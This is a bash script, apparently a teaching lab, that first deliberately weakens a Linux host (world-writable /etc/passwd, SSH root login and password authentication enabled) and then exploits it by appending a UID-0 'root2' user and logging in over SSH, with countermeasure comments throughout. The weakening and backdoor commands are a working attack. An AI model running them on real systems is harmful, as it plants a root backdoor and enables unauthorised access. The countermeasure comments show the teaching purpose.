
#!/bin/bash

# Linux Privilege Escalation Script

# Privilege Escalation

# Writable /etc/passwd

# Explanation: /etc/passwd holds user information. If it's writable, we can add a new user with root privileges.
# Countermeasure: Ensure /etc/passwd is not writable by non-root users.

# Change PasswordAuthentication to yes in sshd_config
sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Permit root login via SSH
sudo sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config

# Restart SSH service
sudo systemctl restart ssh

# Change /etc/passwd permissions
# Explanation: Giving everyone read and write access to /etc/passwd allows non-root users to modify it.
# Countermeasure: Ensure only root has write access to /etc/passwd.
sudo chmod 666 /etc/passwd

# Exploitation

# Check current user
whoami

# Explanation: We verify that we are www-data, the user with limited privileges.
# Countermeasure: Monitor user accounts and their privileges regularly.

# Generate hashed password for the new root user
hash=$(openssl passwd -6 "evil")

# Explanation: We generate a hashed password for the new root user to comply with /etc/passwd format.
# Countermeasure: Avoid storing passwords in plaintext and use secure hashing algorithms.

# Append new root user to /etc/passwd
echo "root2:$hash:0:0:root:/root:/bin/bash" >> /etc/passwd

# Explanation: We add a new user 'root2' with root privileges to /etc/passwd.
# Countermeasure: Regularly audit /etc/passwd for unauthorized modifications.

# SSH into Ubuntu as the new root user
ssh root2@localhost

# Explanation: We verify successful privilege escalation by SSHing into Ubuntu as the new root user.
# Countermeasure: Limit SSH access to trusted users and IP addresses.

# Mitigation

# Keep /etc/passwd permissions as rw-r--râ€“
# Explanation: Restricting write access to /etc/passwd prevents unauthorized modifications.
# Countermeasure: Regularly audit and secure file permissions.

# Disable root login over SSH
# Explanation: Disabling root login enhances security by requiring users to SSH in as non-root and then switch to root.
# Countermeasure: Use sudo and limit root access via SSH.

# Disable password authentication over SSH
# Explanation: Disabling password authentication forces the use of SSH keys for authentication, enhancing security.
# Countermeasure: Use SSH keys for authentication and disable password authentication.

# Delete unfamiliar users and password hashes from /etc/passwd
# Explanation: Removing unauthorized users and password hashes reduces the attack surface.
# Countermeasure: Regularly audit and remove unauthorized users from /etc/passwd.

